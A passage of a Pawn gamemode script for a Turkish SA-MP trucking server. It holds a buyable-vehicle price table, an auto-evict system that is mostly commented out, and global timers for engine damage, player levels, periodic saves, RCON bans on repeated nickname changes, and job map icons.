//	{"Baggage", VClassUnique, 485, 50000},
//	{"Baggage Trailer A", VClassTrailer, 606, 50000},
//	{"Baggage Trailer B", VClassTrailer, 607, 50000},
	{"Bandito", VClassOffRoad, 568, 5000000},
	{"Banshee", VClassSportCar, 429, 7000000},
//	{"Barracks", VClassPublic, 433, 50000},
//	{"Beagle", VClassPlane, 511, 50000},
	{"Benson", VClassIndustrial, 499, 800000},
	{"Berkley's RC Van", VClassIndustrial, 459, 1000000},
	{"BF Injection", VClassOffRoad, 424, 5000000},
	{"BF-400", VClassBike, 581, 1000000},
	{"Bike", VClassBike, 509, 100000},
	{"Blade", VClassLowRider, 536, 5000000},
	{"Blista Compact", VClassSportCar, 496, 2500000},
	{"Bloodring Banger", VClassSaloons, 504, 1500000},
	{"BMX", VClassBike, 481, 100000},
	{"Bobcat", VClassIndustrial, 422, 1200000},
	{"Boxville 1", VClassIndustrial, 498, 500000},
	{"Boxville 2", VClassIndustrial, 609, 500000},
	{"Bravura", VClassSaloons, 401, 900000},
	{"Broadway", VClassLowRider, 575, 2000000},
//	{"Brownstreak (train)", VClassUnique, 538, 50000},
	{"Buccaneer", VClassSaloons, 518, 1000000},
	{"Buffalo", VClassSportCar, 402, 5000000},
	{"Bullet", VClassSportCar, 541, 16000000},
	{"Burrito", VClassIndustrial, 482, 600000},
	{"Bus", VClassPublic, 431, 500000},
	{"Cabbie", VClassPublic, 438, 1300000},
	{"Caddy", VClassUnique, 457, 2000000},
	{"Cadrona", VClassSaloons, 527, 1500000},
	{"Camper", VClassUnique, 483, 1000000},
//	{"Cargo Trailer", VClassTrailer, 435, 50000},
//	{"Cargobob", VClassHelicopter, 548, 50000},
	{"Cement Truck", VClassIndustrial, 524, 500000},
	{"Cheetah", VClassSportCar, 415, 12000000},
	{"Clover", VClassSaloons, 542, 1000000},
	{"Club", VClassSportCar, 589, 3000000},
	{"Coach", VClassPublic, 437, 500000},
	{"Coastguard", VClassBoat, 472, 3000000},
//	{"Combine Harvester", VClassUnique, 532, 50000},
	{"Comet", VClassConvertible, 480, 5000000},
	{"Cropduster", VClassPlane, 512, 8000000},
	{"DFT-30", VClassIndustrial, 578, 500000},
	{"Dinghy", VClassBoat, 473, 1000000},
	{"Dodo", VClassPlane, 593, 8000000},
	{"Dozer", VClassUnique, 486, 1000000},
	{"Dumper", VClassUnique, 406, 40000000},
	{"Dune", VClassOffRoad, 573, 25000000},
	{"Elegant", VClassSaloons, 507, 1000000},
	{"Elegy", VClassSaloons, 562, 13000000},
	{"Emperor", VClassSaloons, 585, 1500000},
//	{"Enforcer", VClassPublic, 427, 50000},
	{"Esperanto", VClassSaloons, 419, 1000000},
	{"Euros", VClassSportCar, 587, 5000000},
	{"Faggio", VClassBike, 462, 200000},
//	{"Farm Trailer", VClassTrailer, 610, 50000},
	{"FBI Rancher", VClassPublic, 490, 5000000},
//	{"FBI Truck", VClassPublic, 528, 50000},
	{"FCR-900", VClassBike, 521, 8000000},
	{"Feltzer", VClassConvertible, 533, 3000000},
//	{"Firetruck", VClassPublic, 407, 50000},
//	{"Firetruck LA", VClassPublic, 544, 50000},
	{"Flash", VClassSportCar, 565, 14000000},
	{"Flatbed", VClassIndustrial, 455, 500000},
//	{"Fluids Trailer", VClassTrailer, 584, 50000},
//	{"Forklift", VClassUnique, 530, 1000000},
	{"Fortune", VClassSaloons, 526, 2500000},
	{"Freeway", VClassBike, 463, 4500000},
//	{"Freight (train)", VClassUnique, 537, 50000},
//	{"Freight Box Trailer (train)", VClassTrailer, 590, 50000},
//	{"Freight Flat Trailer (train)", VClassTrailer, 569, 50000},
	{"Glendale", VClassSaloons, 466, 3000000},
//	{"Glendale Shit", VClassSaloons, 604, 1000000},
	{"Greenwood", VClassSaloons, 492, 3000000},
	{"Hermes", VClassSaloons, 474, 1000000},
	{"Hotdog", VClassUnique, 588, 2500000},
	{"Hotknife", VClassUnique, 434, 20000000},
	{"Hotring Racer 1", VClassSportCar, 494, 15000000},
	{"Hotring Racer 2", VClassSportCar, 502, 16000000},
	{"Hotring Racer 3", VClassSportCar, 503, 17000000},
//	{"HPV1000", VClassPublic, 523, 50000},
//	{"Hunter", VClassHelicopter, 425, 50000},
	{"Huntley", VClassOffRoad, 579, 6000000},
//	{"Hustler", VClassUnique, 545, 50000},
//	{"Hydra", VClassPlane, 520, 50000},
	{"Infernus", VClassSportCar, 411, 20000000},
//	{"Intruder", VClassSaloons, 546, 50000},
	{"Jester", VClassSportCar, 559, 10000000},
	{"Jetmax", VClassBoat, 493, 10000000},
	{"Journey", VClassUnique, 508, 1500000},
	{"Kart", VClassUnique, 571, 10000000},
	{"Landstalker", VClassOffRoad, 400, 2000000},
//	{"Launch", VClassBoat, 595, 1000000},
//	{"Leviathan", VClassHelicopter, 417, 50000},
	{"Linerunner", VClassIndustrial, 403, 500000},
	{"Majestic", VClassSaloons, 517, 1000000},
//	{"Manana", VClassSaloons, 410, 50000},
//	{"Marquis", VClassBoat, 484, 2000000},
	{"Maverick", VClassHelicopter, 487, 10000000},
	{"Merit", VClassSaloons, 551, 2000000},
	{"Mesa", VClassOffRoad, 500, 5000000},
	{"Monster", VClassOffRoad, 444, 25000000},
	{"Monster A", VClassOffRoad, 556, 35000000},
	{"Monster B", VClassOffRoad, 557, 30000000},
	{"Moonbeam", VClassStationCar, 418, 3000000},
	{"Mountain Bike", VClassBike, 510, 300000},
	{"Mower", VClassUnique, 572, 1000000},
	{"Mr Whoopee", VClassUnique, 423, 1000000},
//	{"Mule", VClassIndustrial, 414, 50000},
//	{"Nebula", VClassSaloons, 516, 50000},
//	{"Nevada", VClassPlane, 553, 50000},
//	{"Newsvan", VClassIndustrial, 582, 50000},
	{"NRG-500", VClassBike, 522, 14000000},
	{"Oceanic", VClassSaloons, 467, 1000000},
//	{"Ore Trailer", VClassTrailer, 450, 50000},
//	{"Packer", VClassIndustrial, 443, 50000},
///	{"Patriot", VClassOffRoad, 470, 50000},
	{"PCJ-600", VClassBike, 461, 5000000},
//	{"Perenniel", VClassStationCar, 404, 50000},
	{"Phoenix", VClassSportCar, 603, 10000000},
	{"Picador", VClassIndustrial, 600, 3000000},
//	{"Pizzaboy", VClassBike, 448, 50000},
//	{"Police Car (LSPD)", VClassPublic, 596, 50000},
//	{"Police Car (LVPD)", VClassPublic, 598, 50000},
//	{"Police Car (SFPD)", VClassPublic, 597, 50000},
//	{"Police Maverick", VClassHelicopter, 497, 50000},
//	{"Police Ranger", VClassPublic, 599, 50000},
//	{"Pony", VClassIndustrial, 413, 50000},
//	{"Predator", VClassBoat, 430, 50000},
	{"Premier", VClassSaloons, 426, 1000000},
//	{"Previon", VClassSaloons, 436, 50000},
	{"Primo", VClassSaloons, 547, 1000000},
	{"Quad", VClassBike, 471, 7000000},
//	{"Raindance", VClassHelicopter, 563, 50000},
	{"Rancher 1", VClassOffRoad, 489, 6000000},
//	{"Rancher 2", VClassOffRoad, 505, 5000000},
//	{"RC Bandit", VClassRCVehicle, 441, 50000},
//	{"RC Baron", VClassRCVehicle, 464, 50000},
//	{"RC Cam", VClassRCVehicle, 594, 50000},
//	{"RC Goblin", VClassRCVehicle, 501, 50000},
//	{"RC Raider", VClassRCVehicle, 465, 50000},
//	{"RC Tiger", VClassRCVehicle, 564, 50000},
	{"Reefer", VClassBoat, 453, 4000000},
	{"Regina", VClassStationCar, 479, 1000000},
	{"Remington", VClassLowRider, 534, 10000000},
//	{"Rhino", VClassPublic, 432, 50000},
	{"Roadtrain", VClassIndustrial, 515, 500000},
	{"Romero", VClassUnique, 442, 1000000},
	{"Rumpo", VClassIndustrial, 440, 500000},
//	{"Rustler", VClassPlane, 476, 50000},
	{"Sabre", VClassSportCar, 475, 5000000},
	{"Sadler", VClassIndustrial, 543, 1000000},
//	{"Sadler Shit", VClassIndustrial, 605, 50000},
//	{"SAN News Maverick", VClassHelicopter, 488, 50000},
	{"Sanchez", VClassBike, 468, 5000000},
	{"Sandking", VClassOffRoad, 495, 15000000},
	{"Savanna", VClassLowRider, 567, 8000000},
//	{"Seasparrow", VClassHelicopter, 447, 50000},
	{"Securicar", VClassUnique, 428, 500000},
	{"Sentinel", VClassSaloons, 405, 3000000},
//	{"Shamal", VClassPlane, 519, 50000},
//	{"Skimmer", VClassPlane, 460, 50000},
	{"Slamvan", VClassLowRider, 535, 8000000},
//	{"Solair", VClassStationCar, 458, 50000},
//	{"Sparrow", VClassHelicopter, 469, 50000},
	{"Speeder", VClassBoat, 452, 6000000},
	{"Squallo", VClassBoat, 446, 20000000},
	{"Stafford", VClassSaloons, 580, 3000000},
	{"Stallion", VClassConvertible, 439, 9000000},
	{"Stratum", VClassStationCar, 561, 10000000},
//	{"Streak Trailer (train)", VClassTrailer, 570, 50000},
	{"Stretch", VClassUnique, 409, 8000000},
	{"Stuntplane", VClassPlane, 513, 10000000},
	{"Sultan", VClassSaloons, 560, 12000000},
	{"Sunrise", VClassSaloons, 550, 8000000},
	{"Super GT", VClassSportCar, 506, 8000000},
//	{"S.W.A.T.", VClassPublic, 601, 50000},
	{"Sweeper", VClassUnique, 574, 500000},
	{"Tahoma", VClassLowRider, 566, 1000000},
//	{"Tampa", VClassSaloons, 549, 50000},
	{"Tanker", VClassIndustrial, 514, 500000},
	{"Taxi", VClassPublic, 420, 530000},
	{"Tornado", VClassLowRider, 576, 2000000},
//	{"Towtruck", VClassUnique, 525, 50000},
	{"Tractor", VClassIndustrial, 531, 5000000},
//	{"Tram", VClassUnique, 449, 50000},
//	{"Trashmaster", VClassIndustrial, 408, 50000},
	{"Tropic", VClassBoat, 454, 10000000},
//	{"Tug", VClassUnique, 583, 50000},
//	{"Tug Stairs Trailer", VClassTrailer, 608, 50000},
	{"Turismo", VClassSportCar, 451, 14000000},
	{"Uranus", VClassSportCar, 558, 8000000},
//	{"Utility Trailer", VClassTrailer, 611, 50000},
//	{"Utility Van", VClassIndustrial, 552, 50000},
//	{"Vincent", VClassSaloons, 540, 50000},
//	{"Virgo", VClassSaloons, 491, 50000},
	{"Voodoo", VClassLowRider, 412, 3000000},
//	{"Vortex", VClassUnique, 539, 50000},
//	{"Walton", VClassIndustrial, 478, 50000},
	{"Washington", VClassSaloons, 421, 2000000},
	{"Wayfarer", VClassBike, 586, 3000000},
//	{"Willard", VClassSaloons, 529, 50000},
	{"Windsor", VClassConvertible, 555, 6000000},
    {"Yankee", VClassIndustrial, 456, 500000},
	{"Yosemite", VClassIndustrial, 554, 4000000},
	{"ZR-350", VClassSportCar, 477, 5000000}
};

// This function searches the ABuyableVehicles array to search for the model and returns the index in the array
VehicleBuyable_GetIndex(vModel)
{
	// Loop through all vehicles in the ABuyableVehicles array
	for (new i; i < sizeof(ABuyableVehicles); i++)
	{
	    // Check if the model of the current vehicle is the same as the given model
		if (ABuyableVehicles[i][CarModel] == vModel)
		    return i; // Return the index of the array where the carmodel was found
	}

	return -1;
}

// ************************************************************************************************************************************************************
// PPC_AutoEvict
// ************************************************************************************************************************************************************

// Define the time in days where the auto-evict system should auto-evict player's properties
#define AutoEvictTime   999

// Setup a custom type that holds all data about the auto-evict system
enum TAutoEvict
{
	AEMinutes, // Holds the amount of minutes the server is online
	AEHours, // Holds the amount of hours the server is online
	AEDays // Holds the amount of days the server is online
}
// Setup a variable to hold all data about the auto-evict system
new AutoEvict[TAutoEvict];

// This global auto-evict timer runs every minute and increases the server-online time
forward AutoEvictTimer();
public AutoEvictTimer()
{
	// Increase the amount of minutes the server is online
	AutoEvict[AEMinutes]++;

	// Increase the amount of hours if the minutes reaches 60
	if (AutoEvict[AEMinutes] == 60)
	{
		AutoEvict[AEHours]++;
		AutoEvict[AEMinutes] = 0;
	}

	// Increase the days the server is online if the hours reaches 24
	if (AutoEvict[AEHours] == 24)
	{
	    AutoEvict[AEDays]++;
	    AutoEvict[AEHours] = 0;

		// Auto-evict all properties if the owner didn't login within the AutoEvictTime
		AutoEvictProperties();
	}

	// Save the auto-evict-time
	AutoEvict_Save();

	return 1;
}

// This function scans all houses and businesses and auto-evicts them if needed
AutoEvictProperties()
{
/*
	// Setup local variables
	new File:LogFile, Msg[128];

	// Open the auto-evict-logfile for adding data
	LogFile = fopen("ServerData/AutoEvictLog.ini", io_append);
	// Log the eviction to the logfile
	format(Msg, 128, "Auto-eviction started for day: %i\r\n", AutoEvict[AEDays]);
	fwrite(LogFile, Msg); // And save it to the file
    // Close the logfile
	fclose(LogFile);

	// Loop through all player-owned houses
	for (new HouseID = 1; HouseID < MAX_HOUSES; HouseID++)
	{
		// Check if the house exists (it must have a valid pickup)
		if (IsValidDynamicPickup(AHouseData[HouseID][PickupID]))
		{
		    // Check if this house is owned
		    if (AHouseData[HouseID][Owned] == true)
		    {
				// Check if the AutoEvict-days are equal or higher than the value stored in this house
				if (AHouseData[HouseID][AutoEvictDays] < (AutoEvict[AEDays] - AutoEvictTime))
				{
					// Auto-Evict the house, inform the owner if he's online and remove the house from the owner's account
					House_Evict(HouseID);
					// Also log the auto-eviction to the logfile and inform all admins
					LogAutoEvict(1, AHouseData[HouseID][HouseName], AHouseData[HouseID][Owner]);
				}
			}
		}
	}
	// Loop through all businesses
	for (new BusID = 1; BusID < MAX_BUSINESS; BusID++)
	{
		// Check if the business exists (it must have a valid pickup)
		if (IsValidDynamicPickup(ABusinessData[BusID][PickupID]))
		{
		    // Check if this business is owned
		    if (ABusinessData[BusID][Owned] == true)
			{
				// Check if the AutoEvict-days are equal or higher than the value stored in this business
				if (ABusinessData[BusID][AutoEvictDays] < (AutoEvict[AEDays] - AutoEvictTime))
				{
					// Auto-Evict the business, inform the owner if he's online and remove the business from the owner's account
					Business_Evict(BusID);
					// Also log the auto-eviction to the logfile and inform all admins
					LogAutoEvict(2, ABusinessData[BusID][BusinessName], ABusinessData[BusID][Owner]);
				}
			}
		}
	}

	// Open the auto-evict-logfile for adding data
	LogFile = fopen("ServerData/AutoEvictLog.ini", io_append);
	// Log the eviction to the logfile
	format(Msg, 128, "Auto-eviction ended for day: %i\r\n\r\n", AutoEvict[AEDays]);
	fwrite(LogFile, Msg); // And save it to the file
    // Close the logfile
	fclose(LogFile);
*/
}
/*
// This function informs all admins about the property that has been auto-evicted and also logs the auto-evict into a file
LogAutoEvict(PropertyType, PropertyName[], PropertyOwner[])
{
	// Setup local variables
	new Msg[128], File:LogFile;

	// Determine the type of the property
	if (PropertyType == 1)
		// Setup the text to send to all admins
		format(Msg, 128, "{AAAAAA}House auto-evicted: %s, owner: %s", PropertyName, PropertyOwner);
	else
		// Setup the text to send to all admins
		format(Msg, 128, "{AAAAAA}Business auto-evicted: %s, owner: %s", PropertyName, PropertyOwner);

	// Loop through all players
	for (new i; i < MAX_PLAYERS; i++)
	{
		// Check if the player is an admin
		if (APlayerData[i][PlayerLevel] > 0)
		{
			// Send the given text to the admin
			SendClientMessage(i, 0xFFFFFFFF, Msg);
		}
	}

	// Open the auto-evict-logfile for adding data
	LogFile = fopen("ServerData/AutoEvictLog.ini", io_append);

	// Determine the type of the property
	if (PropertyType == 1)
		// Setup the text to log to the logfile
		format(Msg, 128, "House auto-evicted: %s, owner: %s\r\n", PropertyName, PropertyOwner);
	else
		// Setup the text to log to the logfile
		format(Msg, 128, "Business auto-evicted: %s, owner: %s\r\n", PropertyName, PropertyOwner);

	// Log the eviction to the logfile
	fwrite(LogFile, Msg); // And save it to the file

    // Close the logfile
	fclose(LogFile);
}
*/
// This function loads the file that holds the current auto-evict-time
AutoEvict_Load()
{/*
	// Setup local variables
	new File:AEFile, LineFromFile[100], ParameterName[50], ParameterValue[50];

	// Try to load the auto-evict file
	if (fexist("ServerData/AutoEvict.ini"))
	{
		// Open the auto-evict-file for reading
		AEFile = fopen("ServerData/AutoEvict.ini", io_read);

        // Read the first line of the file
		fread(AEFile, LineFromFile);

		// Keep reading until the end of the file is found (no more data)
		while (strlen(LineFromFile) > 0)
		{
			StripNewLine(LineFromFile); // Strip any newline characters from the LineFromFile
			sscanf(LineFromFile, "s[50]s[50]", ParameterName, ParameterValue); // Extract parametername and parametervalue

			// Store the proper value in the proper place
			if (strcmp(ParameterName, "Minutes", false) == 0) // If the parametername is correct ("Minutes")
				AutoEvict[AEMinutes] = strval(ParameterValue); // Store the Minutes
			if (strcmp(ParameterName, "Hours", false) == 0) // If the parametername is correct ("Hours")
				AutoEvict[AEHours] = strval(ParameterValue); // Store the Hours
			if (strcmp(ParameterName, "Days", false) == 0) // If the parametername is correct ("Days")
				AutoEvict[AEDays] = strval(ParameterValue); // Store the Days

            // Read the next line of the file
			fread(AEFile, LineFromFile);
		}

        // Close the file
		fclose(AEFile);

        // Return if the file was read correctly
		return 1;
	}
	else*/
	    return 0; // Return 0 if the file couldn't be read (doesn't exist)
}

// This function saves the file that holds the current auto-evict-time
AutoEvict_Save()
{/*
	new File:AEFile, LineForFile[100];

	AEFile = fopen("ServerData/AutoEvict.ini", io_write); // Open the auto-evict-file for writing

	format(LineForFile, 100, "Minutes %i\r\n", AutoEvict[AEMinutes]); // Construct the line: "Minutes <Minutes>"
	fwrite(AEFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "Hours %i\r\n", AutoEvict[AEHours]); // Construct the line: "Hours <Hours>"
	fwrite(AEFile, LineForFile); // And save it to the file
	format(LineForFile, 100, "Days %i\r\n", AutoEvict[AEDays]); // Construct the line: "Days <Days>"
	fwrite(AEFile, LineForFile); // And save it to the file

	fclose(AEFile); // Close the file
*/
	return 1;
}
// ************************************************************************************************************************************************************
// PPC_GlobalTimer
// ************************************************************************************************************************************************************

// GlobalTimer100ms
forward GlobalTimer100ms();
public GlobalTimer100ms()
{
	
	foreach(new playerid : Player)
	{
	    
	    if(IsPlayerInAnyVehicle(playerid))
  		{
	  		new veh = GetPlayerVehicleID(playerid);
	    	if(MotorMOD[veh] == 0)
	    	{
	    	     new engine, lights, alarm, doors, bonnet, boot, objective;
				 GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
	             SetVehicleParamsEx(veh, false, lights, alarm, doors, bonnet, boot, objective);
	    	}else{
	    	     new engine, lights, alarm, doors, bonnet, boot, objective;
				 GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
	             SetVehicleParamsEx(veh, true, lights, alarm, doors, bonnet, boot, objective);
	    	}
		}
	    if(APlayerData[playerid][LoggedIn] == true)
	    {
 			// SpeedoMeter Sistemi
			UpdatePlayerSpeedo(playerid);
		}
	}
	return 1;
}

// This global timer runs every second and checks if a player is about to fail his mission (by getting out of his vehicle during a job)
forward GlobalTimer();
public GlobalTimer()
{
    new RCNCmdd[80];

	// Anti Incoming Connection
	IPTime++;
	if(IPTime == 5)
	{
	    IPTime = 0;
	    IPSayi = 0;
	}

    // Dinamik Duyuru Sistemi
	DuyuruTimer++;
	if(DuyuruTimer == 200)
	{
	    DuyuruTimer = 0;
	    RandomDuyuru();
	}

	/////////////////////////////////////////////////////////////////////////////
    GaleriKaydet++;
    if(GaleriKaydet == 600)
    {
    // Araç Sahiplik Sistemi
		Arac_Kaydet();
		printf("Araclar kaydedildi.");
		GaleriKaydet = 0;
	}

	EvIsyeriKaydet++;
	new bool:OyuncuDaKaydet;
	if(EvIsyeriKaydet == 300)
	{
	    EvIsyeriKaydet = 0;
		SaveAllHouses();
		//SaveAllBusiness();
		OyuncuDaKaydet = true;
	}

	// V5 Oyuncu Arayüzü
	UpdateV5UI();

	// Ramazan Vakitleri Sistemi
	new ramSaat, ramDakika, ramSaniye;
	gettime(ramSaat, ramDakika, ramSaniye);
	if(ramSaat == 0 && ramDakika && 0 && ramSaniye && 0) RamazanVakitYukle();
	RamazanUI_Update();

	// YENI TUGIS  106 - 111
/*	case 106,107,108,109,110,111:
	{
		SetPlayerMapIcon(playerid, 19, X,Y,Z, 19, 0, 3);
	}
	// MADISON 112 - 116
	case 112,113,114,115,116:
	{
		SetPlayerMapIcon(playerid, 19, X,Y,Z, 19, 0, 3);
	}
	// MUROLAND 117 - 118
	case 117,118:
	{
		SetPlayerMapIcon(playerid, 19, X,Y,Z, 19, 0, 3);
	}
	// ISTANBUL 119 - 123
	case ,119,120,121,122,123:
	{
		SetPlayerMapIcon(playerid, 19, X,Y,Z, 19, 0, 3);
	}
	// HARBOUR 124 - 125
	case 124,125:
	{
		SetPlayerMapIcon(playerid, 19, X,Y,Z, 19, 0, 3);
	}
	// DIVER 126 - 128
		case 126,127,128:
	{
		SetPlayerMapIcon(playerid, 19, X,Y,Z, 19, 0, 3);
	}
	// LONGWAY 129 - 132
		case 129,130,131,132:
	{
		SetPlayerMapIcon(playerid, 19, X,Y,Z, 19, 0, 3);
	}
	// KASTAMONU 134 - 140 - (87)
	case 87,134,135,136,137,138,139,140:
	{
		SetPlayerMapIcon(playerid, 19, X,Y,Z, 19, 0, 3);
	}
	// EMKATU 165 - 166
	case 165,166:
	{
		SetPlayerMapIcon(playerid, 19, X,Y,Z, 19, 0, 3);
	}
	// TUGAYOGULLARI 178 - 179
		case 178,179:
	{
		SetPlayerMapIcon(playerid, 19, X,Y,Z, 19, 0, 3);
	}
	// KONYA  180 - 186
	case 180,181,182,183,184,185,186:
	{
		SetPlayerMapIcon(playerid, 19, X,Y,Z, 19, 0, 3);
	}
	// ANTALYA 187 - 192
    case 187,188,189,190,191,192:
	{
		SetPlayerMapIcon(playerid, 19, X,Y,Z, 19, 0, 3);
	}*/

    new engine, light,alarm,doors,bonnet,boot,objective, vehid;

	// Setup local variables
	new OldVehicleID, NewVehicleID, OldTrailerID, NewTrailerID, Yazi[128];

	new gun, ay, yil, saat, dakika, saniye, TMMYazi[50];
	new Aylar[12][15]={"Ocak","Subat","Mart","Nisan","Mayis","Haziran","Temmuz","Agustos","Eylul","Ekim","Kasim","Aralik"};
	getdate(yil, ay, gun);
	gettime(saat, dakika, saniye);

	// Loop through all players
	for (new playerid; playerid < MAX_PLAYERS; playerid++)
	{
		// Check if this player is logged in
		if (APlayerData[playerid][LoggedIn] == true)
		{
			// EXP Sistemi
		    StopTime[playerid]++;
		    if(StopTime[playerid] == 10)
		    {
	            StopTime[playerid] = 0;
	            new veh = GetPlayerVehicleID(playerid);
				new Float:health;
				GetVehicleHealth(veh, health);
				if(health < 800 && health > 600)
				{
				    new sans = random(8);
					if(sans == 4)
					{
					    MotorMOD[veh] = 0;
	                    new Yazi2[512], Float:X, Float:Y, Float:Z;
						format(Yazi2, 512, "{00FFFF}* motor hasardan dolayý stop etmiþtir - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

						GetPlayerPos(playerid, X, Y, Z);
						YakinMesaj(Yazi2, 15.0, X, Y, Z);
					}
				}
				if(health < 600 && health > 500)
				{
				    new sans = random(6);
					if(sans == 2)
					{
					    MotorMOD[veh] = 0;
	                    new Yazi3[512], Float:X, Float:Y, Float:Z;
						format(Yazi3, 512, "{00FFFF}* motor hasardan dolayý stop etmiþtir - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

						GetPlayerPos(playerid, X, Y, Z);
						YakinMesaj(Yazi3, 15.0, X, Y, Z);
					}
				}
				if(health < 500 && health > 299)
				{
				    new sans = random(4);
					if(sans == 1)
					{
					    MotorMOD[veh] = 0;
	                    new Yazi1[512], Float:X, Float:Y, Float:Z;
						format(Yazi1, 512, "{00FFFF}* motor hasardan dolayý stop etmiþtir - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

						GetPlayerPos(playerid, X, Y, Z);
						YakinMesaj(Yazi1, 15.0, X, Y, Z);
					}
				}

		    }
			if(AfkDurum[playerid] == 1)
			{
			    AFKSure[playerid]++;
			}
		    // Oyuncu Tepe Yazýsý
			Oyuncu3D_Guncelle(playerid);

			LevelKontrol(playerid);

			PlayerTextDrawTextSize(playerid, UI_Rank[playerid][2], 496.0 + (109 * (EXP[playerid] / Level[playerid]) * 0.02), 0.000000);
			new UI_Yazi[1024];
			format(UI_Yazi, 500, "Level %d (%d/%d)", Level[playerid], EXP[playerid], Level[playerid] * 10);
			PlayerTextDrawSetString(playerid, UI_Rank[playerid][3], UI_Yazi);

			if(Level[playerid] != OncekiRank[playerid] || EXP[playerid] != OncekiEXP[playerid])
			{
				if(APlayerSpawnData[playerid] == true && TextKapat[playerid] == 0)
				{
					PlayerTextDrawShow(playerid, UI_Rank[playerid][0]);
					PlayerTextDrawShow(playerid, UI_Rank[playerid][1]);
					PlayerTextDrawShow(playerid, UI_Rank[playerid][2]);
					PlayerTextDrawShow(playerid, UI_Rank[playerid][3]);
					OncekiRank[playerid] = Level[playerid];
					OncekiEXP[playerid] = EXP[playerid];
				}
			}

			if(APlayerData[playerid][PlayerLevel] != 0)
			{
	  			if(MeslekUI_Mod[playerid] != 0)
				{
	   				for(new i; i < 7; i++)
					{
						PlayerTextDrawHide(playerid, UI_AdminText[playerid][i]);
					}
				}
			}

			// Anti Nick Deðiþtirme
			NickDegisimT[playerid]++;

			if(strcmp(GetName(playerid), SonNick[playerid], true))
			{
				NickDegisimS[playerid]++;
				GetPlayerName(playerid, SonNick[playerid], 40);
				if(NickDegisimS[playerid] == 3)
				{
				    format(RCNCmdd, 80, "banip %s", GetIP2(playerid));
				    SendRconCommand(RCNCmdd);
				}
			}

			if(NickDegisimT[playerid] == 5)
			{
			    NickDegisimT[playerid] = 0;
			    NickDegisimS[playerid] = 0;
			}

		    if(APlayerData[playerid][JobStep] == 1)
	  			{
	             	switch(APlayerData[playerid][JobLoc1]) // doldurma id
					{
						// YENI TUGIS  106 - 111
						case 106,107,108,109,110,111:
						{
						    if(BayrakMesaj[playerid] == 0)
						    {
						    SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI {ff0000} BAYRAK {00FF00} GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
	                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
	                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
	                        BayrakMesaj[playerid] = 1;
							SetPlayerMapIcon(playerid, 19, 2900.0908,-790.8617,10.6765, 19, 0, 3);
			 				}
						}
						// MADISON 112 - 116
						case 112,113,114,115,116:
						{
	     					if(BayrakMesaj[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 2182.5376,-2495.9475,13.0988, 19, 0, 3);
							}
						}
						// MUROLAND 117 - 118
						case 117,118:
						{
	    					if(BayrakMesaj[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 219.1237,2758.3276,59.4508, 19, 0, 3);
							}
						}
						// ISTANBUL 119 - 123
						case 119,120,121,122,123:
						{
	    					if(BayrakMesaj[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 831.7585,-1792.2384,13.6284, 19, 0, 3);
							}
						}
						// HARBOUR 124 - 125
						case 124,125:
						{
	    					if(BayrakMesaj[playerid] == 0)
						    {
							    SendClientMessage(playerid,-1," BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR . ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{FF0000} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        SendClientMessage(playerid,-1,"{00FF00} BILGI : HARITADAKI BAYRAK GIDECEGINIZ MAP'e GIRIS YERIDIR ILK ONCE BAYRAGA GIDINIZ !!!!");
		                        BayrakMesaj[playerid] = 1;
								SetPlayerMapIcon(playerid, 19, 2127.3677,2782.1306,10.7141, 19, 0, 3);
							}
						}
						// DIVER 126 - 128
							case 126,127,128:
						{
